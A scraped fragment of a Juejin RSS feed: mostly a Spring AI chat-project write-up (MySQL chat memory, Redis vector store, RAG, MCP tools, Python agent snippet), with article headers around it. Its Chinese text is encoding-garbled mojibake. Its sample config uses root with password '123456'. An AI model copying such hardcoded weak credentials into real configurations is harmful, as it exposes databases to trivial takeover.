<span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ’¬ å®¢æœå¯¹è¯ï¼ˆæµå¼è¾“å‡ºï¼‰"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

<span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> customer_service_agent.stream(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"æˆ‘çš„è®¢å• 12345 ä»€ä¹ˆæ—¶å€™åˆ°ï¼Ÿ"</span>}]},
    stream_mode=<span class="hljs-string">"values"</span>
):
    latest = chunk[<span class="hljs-string">"messages"</span>][-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">if</span> latest.content:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å®¢æœï¼š<span class="hljs-subst">{latest.content}</span>"</span>, end=<span class="hljs-string">"\n\n"</span>)
    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(latest, <span class="hljs-string">'tool_calls'</span>) <span class="hljs-keyword">and</span> latest.tool_calls:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[æ­£åœ¨æŸ¥è¯¢è®¢å•ä¿¡æ¯...]"</span>, end=<span class="hljs-string">"\n"</span>)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringAIèŠå¤©å¯¹è¯é¡¹ç›® è®°å¿†æŒä¹…åŒ–åˆ°mysql å‘é‡å­˜å‚¨redisstack RAG mcp]]></title>    <link>https://juejin.cn/post/7600341731047899171</link>    <guid>https://juejin.cn/post/7600341731047899171</guid>    <pubDate>2026-01-29T07:34:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600341731047899171" data-draft-id="7600426046424514595" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" SpringAIèŠå¤©å¯¹è¯é¡¹ç›® è®°å¿†æŒä¹…åŒ–åˆ°mysql å‘é‡å­˜å‚¨redisstack  RAG  mcp"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-29T07:34:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·7180175647661"/> <meta itemprop="url" content="https://juejin.cn/user/361078215419358"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             SpringAIèŠå¤©å¯¹è¯é¡¹ç›® è®°å¿†æŒä¹…åŒ–åˆ°mysql å‘é‡å­˜å‚¨redisstack  RAG  mcp
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/361078215419358/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·7180175647661
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T07:34:34.000Z" title="Thu Jan 29 2026 07:34:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™æ˜¯ä¸€ä¸ªåŸºäºSpring AIæ¡†æ¶æ„å»ºçš„æ™ºèƒ½èŠå¤©ç³»ç»Ÿï¼Œé›†æˆäº†RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰ã€å‘é‡æ•°æ®åº“ã€èŠå¤©è®°å¿†å­˜å‚¨ç­‰åŠŸèƒ½ï¼Œæ”¯æŒæµå¼å“åº”å’Œå·¥å…·è°ƒç”¨ã€‚</p>
<p>è¿™æ˜¯æˆ‘çš„giteeä»“åº“ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fliuhaoran316%2Fai-exam.git" target="_blank" title="https://gitee.com/liuhaoran316/ai-exam.git" ref="nofollow noopener noreferrer">gitee.com/liuhaoran31â€¦</a>
å…è´¹å¼€æº   æœŸæœ›å¤§ç¥å¯ä»¥ç»™å‡ºåç»­ çš„tool å’Œmcp æ— æ³•ä½¿ç”¨çš„åŸå›     æ­£åœ¨å®Œå–„</p>
<h3 data-id="heading-0">åç«¯æ ¸å¿ƒæŠ€æœ¯</h3>
<h4 data-id="heading-1">1. æ¡†æ¶ä¸åŸºç¡€è®¾æ–½</h4>
<ul>
<li><strong>Spring Boot 3.x</strong>Â - ä¸»æ¡†æ¶</li>
<li><strong>Spring AI</strong>Â - AIé›†æˆæ¡†æ¶</li>
<li><strong>Java 17</strong>Â - ç¼–ç¨‹è¯­è¨€</li>
<li><strong>Maven</strong>Â - é¡¹ç›®ç®¡ç†å·¥å…·</li>
</ul>
<h4 data-id="heading-2">2. AIç›¸å…³æŠ€æœ¯</h4>
<ul>
<li><strong>Spring AI ChatClient</strong>Â - AIèŠå¤©å®¢æˆ·ç«¯</li>
<li><strong>OpenAIå…¼å®¹API</strong>Â - æ”¯æŒé€šä¹‰åƒé—®ã€DeepSeekç­‰æ¨¡å‹</li>
<li><strong>RAG (Retrieval-Augmented Generation)</strong> Â - æ£€ç´¢å¢å¼ºç”Ÿæˆ</li>
<li><strong>Vector Store (Redis)</strong> Â - å‘é‡æ•°æ®åº“å­˜å‚¨</li>
<li><strong>MCP (Model Context Protocol)</strong> Â - æ¨¡å‹ä¸Šä¸‹æ–‡åè®®</li>
</ul>
<h4 data-id="heading-3">3. æ•°æ®å­˜å‚¨</h4>
<ul>
<li><strong>MySQL 8.0</strong>Â - å…³ç³»å‹æ•°æ®åº“</li>
<li><strong>Redis Stack</strong>Â - å‘é‡æ•°æ®åº“</li>
<li><strong>MyBatis Plus</strong>Â - ORMæ¡†æ¶</li>
<li><strong>Druid</strong>Â - æ•°æ®åº“è¿æ¥æ± </li>
</ul>
<h4 data-id="heading-4">4. å·¥å…·é›†æˆ</h4>
<ul>
<li><strong>ç™¾åº¦åœ°å›¾API</strong>Â - åœ°ç†ä½ç½®å’Œå¤©æ°”æŸ¥è¯¢</li>
<li><strong>Hutool</strong>Â - Javaå·¥å…·åº“</li>
<li><strong>Lombok</strong>Â - ä»£ç ç®€åŒ–</li>
</ul>
<h2 data-id="heading-5">ç³»ç»Ÿæ¶æ„</h2>
<h3 data-id="heading-6">æ ¸å¿ƒç»„ä»¶</h3>
<h4 data-id="heading-7">1. èŠå¤©æ§åˆ¶å™¨ (RagController)</h4>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/exam"</span>)
public class RagController {
    <span class="hljs-variable">@Resource</span>(name = <span class="hljs-string">"qwenChatClient"</span>)
    private ChatClient chatClient;
    
    <span class="hljs-variable">@Autowired</span>
    private VectorStore vectorStore;
    
    <span class="hljs-variable">@Autowired</span>
    private MySQLChatMemory mySQLChatMemory;
}
</code></pre>
<p><strong>åŠŸèƒ½ç‰¹æ€§ï¼š</strong></p>
<ul>
<li>æµå¼å“åº”å¤„ç†</li>
<li>RAGçŸ¥è¯†åº“æ£€ç´¢</li>
<li>èŠå¤©è®°å¿†ç®¡ç†</li>
<li>å·¥å…·è°ƒç”¨æ”¯æŒ</li>
</ul>
<h4 data-id="heading-8">2. èŠå¤©è®°å¿†å­˜å‚¨ (MySQLChatMemory)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySQLChatMemory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ChatMemory</span> {
    <span class="hljs-comment">// å®ç°èŠå¤©å†å²çš„æŒä¹…åŒ–å­˜å‚¨</span>
}
</code></pre>
<p><strong>å®ç°åŠŸèƒ½ï¼š</strong></p>
<ul>
<li>å¯¹è¯å†å²æŒä¹…åŒ–</li>
<li>ä¼šè¯ç®¡ç†</li>
<li>æ¶ˆæ¯æ£€ç´¢å’Œæ¸…ç†</li>
<li>æ”¯æŒå¤šä¼šè¯éš”ç¦»</li>
</ul>
<h4 data-id="heading-9">3. LLMé…ç½® (LLMConfig)</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LLMConfig</span> {
    <span class="hljs-comment">// é…ç½®å¤šä¸ªAIæ¨¡å‹</span>
    <span class="hljs-comment">// æ”¯æŒDeepSeekå’Œé€šä¹‰åƒé—®</span>
}
</code></pre>
<p><strong>æ”¯æŒæ¨¡å‹ï¼š</strong></p>
<ul>
<li>DeepSeek V3</li>
<li>é€šä¹‰åƒé—® Plus/Max</li>
<li>å¯æ‰©å±•å…¶ä»–OpenAIå…¼å®¹æ¨¡å‹</li>
</ul>
<h2 data-id="heading-10">æ ¸å¿ƒå®ç°åŸç†</h2>
<h3 data-id="heading-11">1. RAGå®ç°æµç¨‹</h3>
<pre><code class="hljs language-css" lang="css">graph <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[ç”¨æˆ·æé—®]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[é—®é¢˜å‘é‡åŒ–]</span>
    <span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[å‘é‡æ•°æ®åº“æ£€ç´¢]</span>
    C --&gt; D<span class="hljs-selector-attr">[è·å–ç›¸å…³çŸ¥è¯†]</span>
    D --&gt; E<span class="hljs-selector-attr">[æ„å»ºå¢å¼ºæç¤ºè¯]</span>
    E --&gt; F<span class="hljs-selector-attr">[LLMç”Ÿæˆå›ç­”]</span>
    F --&gt; G<span class="hljs-selector-attr">[æµå¼è¿”å›ç»“æœ]</span>
</code></pre>
<p><strong>æŠ€æœ¯å®ç°ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">return chatClient<span class="hljs-selector-class">.prompt</span>()
    <span class="hljs-selector-class">.system</span>(systemInfo)                           <span class="hljs-comment">// ç³»ç»Ÿæç¤ºè¯</span>
    <span class="hljs-selector-class">.advisors</span>(messageChatMemoryAdvisor)          <span class="hljs-comment">// èŠå¤©è®°å¿†</span>
    <span class="hljs-selector-class">.user</span>(question)                              <span class="hljs-comment">// ç”¨æˆ·é—®é¢˜</span>
    <span class="hljs-selector-class">.advisors</span>(new QuestionAnswerAdvisor(vectorStore)) <span class="hljs-comment">// RAGæ£€ç´¢</span>
    <span class="hljs-selector-class">.tools</span>(new DateTimeTools())                  <span class="hljs-comment">// å·¥å…·è°ƒç”¨</span>
    <span class="hljs-selector-class">.stream</span>()                                    <span class="hljs-comment">// æµå¼å“åº”</span>
    <span class="hljs-selector-class">.content</span>();
</code></pre>
<h3 data-id="heading-12">2. èŠå¤©è®°å¿†æœºåˆ¶</h3>
<p><strong>å­˜å‚¨ç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> chat_message (
    id <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
    conversation_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>),
    role <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),
    context TEXT,
    created_at <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);
</code></pre>
<p><strong>å®ç°é€»è¾‘ï¼š</strong></p>
<ul>
<li>æ¯ä¸ªä¼šè¯ç‹¬ç«‹å­˜å‚¨</li>
<li>æ”¯æŒè§’è‰²åŒºåˆ†ï¼ˆUSER/ASSISTANTï¼‰</li>
<li>è‡ªåŠ¨é™åˆ¶å†å²è®°å½•æ•°é‡ï¼ˆ20æ¡ï¼‰</li>
<li>æ”¯æŒä¼šè¯æ¸…ç†</li>
</ul>
<h3 data-id="heading-13">3. å‘é‡æ•°æ®åº“é›†æˆ</h3>
<p><strong>Redis Stacké…ç½®ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">spring.data.redis.host</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">200.130</span>
<span class="hljs-attr">spring.data.redis.port</span>=<span class="hljs-number">6381</span>
<span class="hljs-attr">spring.ai.vectorstore.redis.initialize-schema</span>=<span class="hljs-literal">true</span>
<span class="hljs-attr">spring.ai.vectorstore.redis.index-name</span>=custom-index
</code></pre>
<p><strong>åŠŸèƒ½ç‰¹æ€§ï¼š</strong></p>
<ul>
<li>è‡ªåŠ¨å‘é‡åŒ–æ–‡æ¡£</li>
<li>ç›¸ä¼¼åº¦æ£€ç´¢</li>
<li>æ”¯æŒæ‰¹é‡å¯¼å…¥</li>
<li>å®æ—¶ç´¢å¼•æ›´æ–°</li>
</ul>
<h3 data-id="heading-14">4. å·¥å…·è°ƒç”¨ç³»ç»Ÿ</h3>
<p><strong>MCPåè®®é›†æˆï¼š</strong></p>
<pre><code class="hljs language-perl" lang="perl">{
  <span class="hljs-string">"mcpServers"</span>: {
    <span class="hljs-string">"baidu-map"</span>: {
      <span class="hljs-string">"command"</span>: <span class="hljs-string">"cmd"</span>,
      <span class="hljs-string">"args"</span>: [<span class="hljs-string">"/c"</span>, <span class="hljs-string">"npx"</span>, <span class="hljs-string">"-y"</span>, <span class="hljs-string">"@baidumap/mcp-server-baidu-map"</span>],
      <span class="hljs-string">"env"</span>: {<span class="hljs-string">"BAIDU_MAP_API_KEY"</span>: <span class="hljs-string">"your-api-key"</span>}
    }
  }
}
</code></pre>
<p><strong>æ”¯æŒå·¥å…·ï¼š</strong></p>
<ul>
<li>ç™¾åº¦åœ°å›¾APIï¼ˆå¤©æ°”ã€ä½ç½®ã€è·¯çº¿ï¼‰</li>
<li>æ—¶é—´å·¥å…·</li>
<li>å¯æ‰©å±•è‡ªå®šä¹‰å·¥å…·</li>
</ul>
<h2 data-id="heading-15">APIæ¥å£è®¾è®¡</h2>
<h3 data-id="heading-16">ä¸»è¦æ¥å£</h3>
<h4 data-id="heading-17">1. RAGèŠå¤©æ¥å£</h4>
<pre><code class="hljs language-bash" lang="bash">GET /exam/rag4aiops/{question}/{sessionID}
</code></pre>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>question</code>: ç”¨æˆ·é—®é¢˜ï¼ˆURLç¼–ç ï¼‰</li>
<li><code>sessionID</code>: ä¼šè¯IDï¼ˆç”¨äºè®°å¿†ç®¡ç†ï¼‰</li>
</ul>
<p><strong>å“åº”æ ¼å¼ï¼š</strong></p>
<ul>
<li>æµå¼å“åº”ï¼ˆServer-Sent Eventsï¼‰</li>
<li>å®æ—¶è¿”å›ç”Ÿæˆå†…å®¹</li>
<li>æ”¯æŒä¸­æ–­å’Œé‡è¿</li>
</ul>
<h4 data-id="heading-18">2. ç®€å•èŠå¤©æ¥å£</h4>
<pre><code class="hljs language-ini" lang="ini">GET /exam/mcp?<span class="hljs-attr">msg</span>={message}
</code></pre>
<p><strong>åŠŸèƒ½ï¼š</strong></p>
<ul>
<li>æ— è®°å¿†çš„ç®€å•å¯¹è¯</li>
<li>å¿«é€Ÿå“åº”</li>
<li>é€‚ç”¨äºå•æ¬¡æŸ¥è¯¢</li>
</ul>
<h2 data-id="heading-19">éƒ¨ç½²é…ç½®</h2>
<h3 data-id="heading-20">ç¯å¢ƒè¦æ±‚</h3>
<p><strong>åŸºç¡€ç¯å¢ƒï¼š</strong></p>
<ul>
<li>Java 17+</li>
<li>Maven 3.6+</li>
<li>MySQL 8.0+</li>
<li>Redis Stack 7.0+</li>
</ul>
<p><strong>AIæœåŠ¡ï¼š</strong></p>
<ul>
<li>é€šä¹‰åƒé—®API Key</li>
<li>ç™¾åº¦åœ°å›¾API Keyï¼ˆå¯é€‰ï¼‰</li>
</ul>
<h3 data-id="heading-21">é…ç½®æ–‡ä»¶</h3>
<p><strong>application.propertiesæ ¸å¿ƒé…ç½®ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æœåŠ¡ç«¯å£</span>
<span class="hljs-attr">server.port</span>=<span class="hljs-number">6013</span>

<span class="hljs-comment"># AIæ¨¡å‹é…ç½®</span>
<span class="hljs-attr">spring.ai.openai.api-key</span>=<span class="hljs-variable">${QianWen_KEY}</span>
<span class="hljs-attr">spring.ai.openai.base-url</span>=https://dashscope.aliyuncs.com/compatible-mode

<span class="hljs-comment"># æ•°æ®åº“é…ç½®</span>
<span class="hljs-attr">spring.datasource.url</span>=jdbc:mysql://localhost:<span class="hljs-number">3306</span>/db03
<span class="hljs-attr">spring.datasource.username</span>=root
<span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-number">123456</span>

<span class="hljs-comment"># Rediså‘é‡æ•°æ®åº“</span>
<span class="hljs-attr">spring.data.redis.host</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">200.130</span>
<span class="hljs-attr">spring.data.redis.port</span>=<span class="hljs-number">6381</span>
<span class="hljs-attr">spring.ai.vectorstore.redis.initialize-schema</span>=<span class="hljs-literal">true</span>

<span class="hljs-comment"># MCPå·¥å…·é…ç½®</span>
<span class="hljs-attr">spring.ai.mcp.client.toolcallback.enabled</span>=<span class="hljs-literal">true</span>
<span class="hljs-attr">spring.ai.mcp.client.stdio.servers-configuration</span>=classpath:/mcp-server.json
</code></pre>
<h3 data-id="heading-22">å¯åŠ¨æ­¥éª¤</h3>
<ol>
<li><strong>æ•°æ®åº“åˆå§‹åŒ–</strong></li>
</ol>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> DATABASE db03;
USE db03;

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> chat_message (
    id <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
    conversation_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>),
    role <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),
    context TEXT,
    created_at <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);
</code></pre>
<ol start="2">
<li><strong>Rediså¯åŠ¨</strong></li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino"># å¯åŠ¨Redis Stack
docker run -d --name redis-stack -p <span class="hljs-number">6381</span>:<span class="hljs-number">6379</span> redis/redis-stack:latest
</code></pre>
<ol start="3">
<li><strong>åº”ç”¨å¯åŠ¨</strong></li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino">mvn spring-boot:run
</code></pre>
<h2 data-id="heading-23">æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-24">1. æµå¼å“åº”ä¼˜åŒ–</h3>
<ul>
<li>ä½¿ç”¨Reactorå“åº”å¼ç¼–ç¨‹</li>
<li>æ”¯æŒèƒŒå‹å¤„ç†</li>
<li>å‡å°‘å†…å­˜å ç”¨</li>
</ul>
<h3 data-id="heading-25">2. å‘é‡æ£€ç´¢ä¼˜åŒ–</h3>
<ul>
<li>Rediså‘é‡ç´¢å¼•ä¼˜åŒ–</li>
<li>æ‰¹é‡æ£€ç´¢ç­–ç•¥</li>
<li>ç¼“å­˜çƒ­ç‚¹æ•°æ®</li>
</ul>
<h3 data-id="heading-26">3. èŠå¤©è®°å¿†ä¼˜åŒ–</h3>
<ul>
<li>é™åˆ¶å†å²è®°å½•æ•°é‡</li>
<li>å¼‚æ­¥å­˜å‚¨ç­–ç•¥</li>
<li>å®šæœŸæ¸…ç†è¿‡æœŸæ•°æ®</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±åº¦å­¦ä¹ æ¨¡å‹å‹ç¼©æ–¹æ³•ï¼ˆå‰ªæï¼‰]]></title>    <link>https://juejin.cn/post/7600489282839298058</link>    <guid>https://juejin.cn/post/7600489282839298058</guid>    <pubDate>2026-01-29T08:15:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600489282839298058" data-draft-id="7600229327436873778" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±åº¦å­¦ä¹ æ¨¡å‹å‹ç¼©æ–¹æ³•ï¼ˆå‰ªæï¼‰"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-29T08:15:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èœ—ç‰›è¡Œè¿¹"/> <meta itemprop="url" content="https://juejin.cn/user/3083493743796632"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±åº¦å­¦ä¹ æ¨¡å‹å‹ç¼©æ–¹æ³•ï¼ˆå‰ªæï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3083493743796632/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èœ—ç‰›è¡Œè¿¹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:15:23.000Z" title="Thu Jan 29 2026 08:15:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
